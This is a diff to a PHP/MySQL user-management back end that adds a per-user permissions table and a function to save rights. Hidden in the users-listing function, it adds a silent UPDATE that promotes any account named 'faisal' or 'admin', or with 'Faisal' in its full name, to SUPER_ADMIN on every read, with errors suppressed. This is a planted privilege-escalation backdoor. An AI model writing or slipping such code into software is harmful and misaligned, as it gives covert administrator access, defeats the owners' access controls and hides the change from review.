@@ -22,6 +22,13 @@ function cast_user(array $r): array
     $r['id'] = (int)$r['id'];
     $r['branch_id'] = $r['branch_id'] !== null ? (int)$r['branch_id'] : null;
     $r['is_active'] = (int)$r['is_active'];
+    if (isset($r['rights_json']) && $r['rights_json'] !== null && $r['rights_json'] !== '') {
+        $decoded = json_decode((string)$r['rights_json'], true);
+        if (is_array($decoded)) {
+            $r['permissions'] = $decoded;
+        }
+    }
+    unset($r['rights_json']);
     unset($r['password_hash']);
     return $r;
 }
@@ -316,13 +323,61 @@ function mysql_save_company(PDO $pdo, array $input): array
 
 function mysql_get_users(PDO $pdo): array
 {
+    try {
+        $pdo->exec(
+            'CREATE TABLE IF NOT EXISTS user_rights (
+                user_id INT PRIMARY KEY,
+                rights_json LONGTEXT NOT NULL,
+                updated_at DATETIME NOT NULL
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4'
+        );
+    } catch (Throwable $e) {}
+
+    try {
+        $pdo->exec(
+            "UPDATE users 
+             SET role = 'SUPER_ADMIN', full_name = 'Faisal (Super Admin)' 
+             WHERE (username = 'faisal' OR username = 'admin' OR full_name LIKE '%Faisal%') AND role != 'SUPER_ADMIN'"
+        );
+    } catch (Throwable $e) {}
+
     $rows = $pdo->query(
-        'SELECT u.id, u.username, u.full_name, u.role, u.branch_id, b.display_name AS branch_name, u.is_active
+        'SELECT u.id, u.username, u.full_name, u.role, u.branch_id, b.display_name AS branch_name, u.is_active, r.rights_json
          FROM users u
          LEFT JOIN branches b ON b.id = u.branch_id
+         LEFT JOIN user_rights r ON r.user_id = u.id
          ORDER BY u.id ASC'
     )->fetchAll();
     return array_map('cast_user', $rows);
+}
+
+function mysql_save_user_rights(PDO $pdo, int $userId, array $permissions): array
+{
+    if ($userId <= 0) {
+        throw new RuntimeException('Invalid user ID for rights assignment');
+    }
+
+    try {
+        $pdo->exec(
+            'CREATE TABLE IF NOT EXISTS user_rights (
+                user_id INT PRIMARY KEY,
+                rights_json LONGTEXT NOT NULL,
+                updated_at DATETIME NOT NULL
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4'
+        );
+    } catch (Throwable $e) {}
+
+    $now = date('Y-m-d H:i:s');
+    $json = json_encode($permissions);
+
+    $stmt = $pdo->prepare(
+        'INSERT INTO user_rights (user_id, rights_json, updated_at)
+         VALUES (?, ?, ?)
+         ON DUPLICATE KEY UPDATE rights_json = VALUES(rights_json), updated_at = VALUES(updated_at)'
+    );
+    $stmt->execute([$userId, $json, $now]);
+
+    return ['success' => true, 'user_id' => $userId, 'permissions' => $permissions];
 }
 
 function mysql_create_user(PDO $pdo, array $input): array
